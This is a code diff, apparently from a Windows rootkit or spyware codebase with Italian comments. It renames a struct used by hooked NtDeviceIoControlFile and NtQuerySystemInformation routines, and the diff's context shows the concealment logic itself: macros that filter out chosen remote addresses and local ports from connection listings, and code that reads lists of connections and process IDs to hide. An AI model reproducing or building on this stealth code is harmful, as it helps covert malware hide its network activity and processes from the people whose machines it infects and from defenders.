@@ -508,7 +508,7 @@ DWORD NtQuerySystemInformationHook_setup(HMServiceStruct *pData)
 // se scandendo le successive entry nella lista trovo la stessa localport con 0.0.0.0
 // tolgo pure questa...
 #define IF_CON_NOT_PRESENT(x,y) BOOL con_present = FALSE; \
-		                        connection_hide_struct *p_chs = y; \
+		                        CONNECTION_HIDE *p_chs = y; \
 	                            if (p_chs) while (IS_SET_CONNETCION_HIDE_STRUCT((*p_chs))) { \
 									if ( (p_chs->ip_address == x->dwRemoteAddr) || (x->dwLocalAddr == 0 && x->dwLocalPort == pData->dwLocalPort && pData->dwLocalPort) ) { \
 										con_present = TRUE;  \
@@ -520,7 +520,7 @@ DWORD NtQuerySystemInformationHook_setup(HMServiceStruct *pData)
 // Per ricerca localport di Internet Explorer
 //
 #define IF_CON_PRESENT(x,y) BOOL con_presentTmp = FALSE; \
-		                        connection_hide_struct *p_chsTmp = y; \
+		                        CONNECTION_HIDE *p_chsTmp = y; \
 	                            if (p_chsTmp) while ( IS_SET_CONNETCION_HIDE_STRUCT((*p_chsTmp)) ) { \
 									if ( (p_chsTmp->ip_address == x->dwRemoteAddr) && (p_chsTmp->port == x->dwRemotePort) ) { \
 										con_presentTmp = TRUE;  \
@@ -575,7 +575,7 @@ DWORD __stdcall NtDeviceIoControlFileHook(DWORD ARG1,
 	char *NxtEntry;
 	int NumStr, NumBytes;
 	char szPID[8];
-	connection_hide_struct *p_connection_hide;
+	CONNECTION_HIDE *p_connection_hide;
 	PID_HIDE *p_pid_hide;
 	BOOL to_hide_block;
 
@@ -634,7 +634,7 @@ DWORD __stdcall NtDeviceIoControlFileHook(DWORD ARG1,
 
 	// Legge la lista delle connessioni da nascondere per usarla nella 
 	// scansione delle row semplici
-	p_connection_hide = (connection_hide_struct *)pData->pHM_IpcCliRead(WR_HIDE_CON);
+	p_connection_hide = (CONNECTION_HIDE *)pData->pHM_IpcCliRead(WR_HIDE_CON);
 
 	// Legge la lista di PID da nascondere per usarla nella scansione
 	// delle row extended o dei file handle
